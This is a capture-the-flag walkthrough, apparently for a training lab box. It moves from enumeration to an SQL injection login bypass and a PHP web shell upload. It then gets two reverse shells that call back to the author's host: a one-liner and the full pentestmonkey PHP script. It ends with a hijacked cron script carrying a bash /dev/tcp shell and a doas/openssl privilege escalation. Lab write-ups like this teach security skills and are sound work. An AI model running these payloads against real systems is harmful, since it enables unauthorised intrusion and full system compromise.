So after getting the room ip and hitting it into the browser gave me the default apache page

![apace](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2jXbyL79IpN7aO7Fa1XYpoeJnjz-1ADwUPUkO6rNUwbUP9VDzTwsFb2EouiY4Sn_aWT1I66fJ2yZ4iAuQpyApSRF2QBga4agCEMuNGlIp5OFbJnY5qiNrcEghj0hp0-aeWiG4lnt7AFU/s640/Apache+Default+Page.PNG)

so i ran a nmap and directory enumuration on it and got some result.

These are the result of directory enumuration

- [17:31:20] 301 -  312B  - /admin  ->  http://10.48.155.74/admin/            
- [17:31:21] 200 -  453B  - /admin/                                           
- [17:32:00] 200 -   25B  - /passwd   

And here is the nmap result

Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-27 17:30 +0530
Nmap scan report for 10.48.155.74
Host is up (0.062s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=5/27%OT=22%CT=1%CU=42278%PV=Y%DS=3%DC=T%G=Y%TM=6A16DD3
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:05%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=108%TI=Z%CI=Z%
OS:II=I%TS=A)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%
OS:ISR=10D%TI=Z%CI=Z%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7
OS:%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W
OS:4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=Y%Q=)T1(
OS:R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

The admin endpoint gave me a file named id_rsa

I though it will be ssh key

But opening it gave me string. 

VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE


When decoding this text gave me Trust me it is not this easy..now get back to enumeration :D

While when visiting the endpoint gave me the string

bm90IHRoaXMgZWFzeSA6RA==

Its a obbious base64 and decoding it gave me 

not this easy :D

And if we consider the nmap scan the dirctroy enumuration we have done till now was for the port 80 

And in nmap scan 443 was also open so we're going to do directory enumuration on the port 443 to see what is there 

after a directory enumuration we got that there was a endpoint 

It was /management.

![management](management.png)

now we could see a login page we could do a attack here to get the credentials.

to capture the req when we opened the network tab after entereing the wrong credential in the response it was revealing the sql query and yup i was cliked with sql injection.

The query was 

{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' and password = md5('Admin') "}


And as per the query i entered the 

admin' -- -

In the username field and anything in the password field.

After it when i tapped on login and yup i got loggedin In

![loggedin](loggedin.png)

And yet there is a functionlity to upload image as we could try to embedded our payload into the image and do something.

After uploading a html file and watching that it executes or not.

The content inside the html file was 

<img src="http://YOUR_IP:5555/ping">

I uploaded this before uploading to check server is execting or not.


But after uploading i had opened a simple python server already on my system to listen for incoming connections.

But only after uploading i was not getting the connection back from the target.

So i decided to open the file in a new the uploaded file.

When we opened the file in a new tab i got a valid hit on my python server.

It means the file is executing only if it is being opened in a new tab.

So then i go to check for command exection and this time i decided to uplaod a php file when i uplaoded a php file with this content

<?php echo shell_exec(whoami); ?>

I got my command exected when i opened the file in a new tab.

It was showing the output of whomai as www-data and now we're sure that command is execting.

Now after trying on a lot of php shells and in the try to get the reverse shell.

2 shells actually get me the rev shell

1st code is 

```php

php -r '$sock=fsockopen("192.168.246.164",4444);exec("sh <&3 >&3 2>&3");'
```
2nd  code is 

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.246.164';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

after uploading this file and getting i got instanlty shell pop up into my listener setup by 

nc -lvnp 4444

I recommend if you dont get the shell even after uploading the file try opening the shell file in a new tab.

I recommend too to open both files in new tab if not getting the shell but opening the first payload in mandatory.

then after getting the rev shell and enumurating the file system.


I got 2 users in the /home folder.

- ubuntu
- plot_admin

But we are not permitted to read the content inside the plot_admin.


But its now a normal shell and we're having difficulty in doing our tasks so are making a full tty terminal with the commadn 

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

I was exploring the filesytem and at the location /var/www/html/445/management

There was a file named initialize.php

And it contained valuable infos.

in which sqldb password was there too.

but since if we consider the nmap scan it is clearly mysql not mentioned and also with the scan 

nmap -sV 10.48.155.74 --top-ports 1000 | grep mysql

I am not able to find the mysql anywhere else.

So we were now unable to connect to mysql.

But inside the shell that we have gained if we do there we can do with the command

mysql -u tms_user -p

And then enter the password and login and after copying the same steps we get the mysql server.

As i logged in i cheked databases with the sql command 

show databases;

and there were 2 databases

show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| tms_db             |
+--------------------+
2 rows in set (0.01 sec)


In the tms_db here are tables inside it

show tables;
show tables;
+------------------+
| Tables_in_tms_db |
+------------------+
| drivers_list     |
| drivers_meta     |
| offense_items    |
| offense_list     |
| offenses         |
| system_info      |
| users            |
+------------------+
7 rows in set (0.00 sec)

This was all about the sql database but nothing important for us was there.

So we went onto seraching in the filesystem and eventually in cornjob i found a file named backup.sh

So after seeing it permissiion i saw i can rewrite it so i rewrite the file backup.sh with a reverse shell.

and all i did this process is below 

cd /var/www/scripts && printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/192.168.246.164/4444 0>&1"' > backup.sh && chmod +x backup.sh

Then i execute the backup.sh by triggering the cronjob with the command date command and cronjob executed.

Then i did open a listener on the port as specified in the payload in backup.sh

and when i execute date and deattach from the terminal with ctrl +z 

I got the connection on my listener and i was logged in now as  the user 

plot_admin

And since i am now loggedin as plot_admin

We could read that file named user.txt

And the contet inside the user.txt was the answer of q1.

For the next i tried Finding potentially dangerous SUID binaries with the command 

find / -perm -u=s -type f 2>/dev/null

And noticable potential dnagerous SUID binary was 

/etc/doas.conf

And the way to exploit is to process the steps below 

set LFILE varible to /root/root.txt

with the command 

LFILE=/root/root.txt

Next do follow this syntax of doas

doas -u root openssl enc -in "$LFILE"

And after exectuion of this command we will get our last flag that is root flag.
